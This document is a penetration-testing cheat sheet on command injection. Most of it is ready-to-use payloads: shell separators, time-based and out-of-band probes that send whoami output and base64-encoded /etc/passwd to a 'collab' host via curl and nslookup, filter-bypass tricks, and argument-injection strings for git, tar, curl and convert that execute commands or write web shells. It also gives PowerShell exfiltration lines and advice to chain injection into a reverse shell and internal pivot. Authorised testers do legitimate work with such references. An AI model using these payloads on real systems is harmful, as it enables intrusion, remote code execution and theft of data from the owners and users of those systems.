# Command Injection

Anywhere the app shells out: image conversion, PDF generation, ping/traceroute, git
operations, archive extraction, `ffmpeg`, `wkhtmltopdf`, backup scripts.

---

## Detection

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id
```

Time-based when blind: `; sleep 5`, `| ping -c 5 127.0.0.1`, `$(sleep 5)`.

OOB when blind: `; curl http://collab/$(whoami)`, `; nslookup $(id).collab`.

---

## Space and character bypass

```
${IFS}   $IFS   %09   %0a   {cat,/etc/passwd}   c\at
```

Quote bypass: `"$@"`, `'${IFS}'`, `$'\x20'`.

---

## Argument injection (no shell metacharacters needed)

When the app does `exec("convert " + file)`:

```
--output=/var/www/x.php
-o /tmp/x
--config /tmp/evil.conf
```

For `git`: `--upload-pack='id'`, `ext::sh -c id`.
For `tar`: `--checkpoint-action=exec=sh x.sh`.
For `curl`: `-o /var/www/x.php`, `--config`.

---

## Blind extraction

```
; curl http://collab/$(whoami | base64)
; for f in /etc/passwd; do curl http://collab/$(base64 -w0 $f); done
```

---

## Windows

```
& whoami
| whoami
%0a whoami
&& whoami
powershell -c "iwr http://collab/$env:USERNAME"
```

---

## Where it hides

- Filename in an upload that gets converted.
- "Test connection" buttons (ping, telnet, SMTP).
- Git import ("clone from URL").
- Archive extraction (zip-slip + command).
- Image resize with a URL parameter.
- PDF export with a custom page size.

---

## Go deeper

1. Test argument injection even when `;` is filtered.
2. Test the filename, not just a text field.
3. Test with a space in the path (`/tmp/a b/x`) to see how quoting is done.
4. Chain: command injection → reverse shell → internal pivot.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
